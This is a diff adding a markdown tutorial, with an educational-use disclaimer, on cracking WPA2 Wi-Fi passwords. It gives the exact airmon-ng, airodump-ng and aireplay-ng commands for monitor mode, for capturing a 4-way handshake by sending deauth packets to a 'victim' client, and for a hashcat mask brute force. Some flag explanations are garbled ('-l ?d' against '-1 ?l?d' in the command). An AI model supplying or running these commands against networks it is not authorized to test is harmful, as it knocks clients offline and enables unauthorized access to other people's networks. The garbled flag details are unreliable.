@@ -1,0 +1,78 @@
+# **DISCLAIMER: This software/tutorial is for educational purposes only. It should not be used for illegal activity. The author is not responsible for its use.**
+
+### #1 Monitor Mode
+
+Begin by listing wireless interfaces that support monitor mode with:
+
+`sudo airmon-ng`
+
+You should see something like this:         
+`phy0	wlan0		ath9k_htc	Qualcomm Atheros Communications AR9271 802.11n`
+
+To put your interface in monitor mode:
+
+`airmon-ng start wlan0`
+
+To turn off monitor mode:
+
+`airmon-ng stop wlan0mon`
+
+Run `iwconfig` to verify the card is in monitor mode
+
+### #2 Airodump-ng
+
+Start listening to 802.11 Beacon frames broadcast by nearby wireless routers using your monitor interface:
+
+`airodump-ng wlan0mon`
+
+You should see a result like this:
+
+CH 13 ][ Elapsed: 52 s ][ 2017–07–23 15:49 
+
+BSSID PWR Beacons #Data, #/s CH MB ENC CIPHER AUTH ESSID 
+
+14:91:82:F7:52:EB -66 205 26 0 1 54e OPN belkin.2e8.guests
+
+### Capture a 4-way handshake
+
+If you're testing on your own home network i found the easiest way to capture a handshake was to simply turn off my WiFi Smart bulbs and then turn them back on. You should have a handshake in a few seconds.
+
+Another option is to send out a deauth packet to force the client off the network. Their device will automatically reconnect and you will have the handshake. leave airodump-ng running and open a new terminal. We will use the aireplay-ng command to send fake deauth packets to our victim.
+
+`-0 2` specifies we would like to send 2 deauth packets. Increase this number
+if need be with the risk of noticably interrupting client network activity
+
+`-a` is the MAC of the access point
+
+`-c` is the MAC of the client
+
+Your command should look like this:
+
+`aireplay-ng -0 2 -a 9C:5C:8E:C9:AB:C0 -c 64:BC:0C:48:97:F7 mon0`
+
+Once you’ve captured a handshake, press `ctrl-c` to quit airodump-ng. You should see a .cap file wherever you told airodump-ng to save the capture (likely called -01.cap). Use this capture file to crack the network password.
+
+### #3 Converting the .cap to .hccapx
+
+Before we can crack the password we need to convert our `.cap` file to the equivalent hashcat file format `.hccapx`. You can do this easily by uploading the .cap file to https://hashcat.net/cap2hccapx/
+
+### #4 Cracking with Hashcat
+
+`-m` 2500 tells hashcat that we are trying to attack a WPA2 pre-shared key as the hash type. Hashcat has a bunch of pre-defined hash types that are all designated a number. You can use the –help switch to get a list of these different types, but for now we’re doing WPA2 so we’ll use 2500.
+
+`-a 3` sets the attack mode and tells hashcat that we are brute forcing our attempts. A list of the other attack modes can be found using the –help switch.
+
+`-l ?d` specifies that we are going to use a custom character set for our brute force attempt. Our custom character set is defined by what’s after the ?. In this case we’re using ?d, which means “use only digits” (0-9). Other options here would be ?l for letters (uppercase and lowercase) and ?s for special characters. The -1 indicates that this it the first custom character set that we are defining in this command. More can be created with -2, -3, etc.
+
+`-o cracked` is used to specify an output file called simply “cracked” that will contain the WPA2 pre-shared key in plain text once the crack happens successfully.
+
+`capturefile-01.hccapx` is the name of our capture file containing the handshake. Note that if you try to use a .cap file here, it won’t work, which is why we converted it earlier.
+
+`?l?l?l?l?l?l?l?l?d?d?d`` This is our mask, which tells hashcat what we want to do with our custom-defined character set. Notice that in our mask we specify the first 8 characters are letters followed by 3 numbers. This is a very common password formula with Spectrum
+
+`sudo hashcat -m 2500 -a 3 -1 ?l?d -o cracked capturefile-01.hccapx ?l?l?l?l?l?l?l?l?d?d?d`
+
+Below you'll see a successfully cracked password where the last two fields separated by : are the network name and password.
+![](https://miro.medium.com/max/952/1*tzJXEN-g-cjBlLPF1fK_4A.png)
+
+Where the last two fields separated by : are the network name and password respectively.
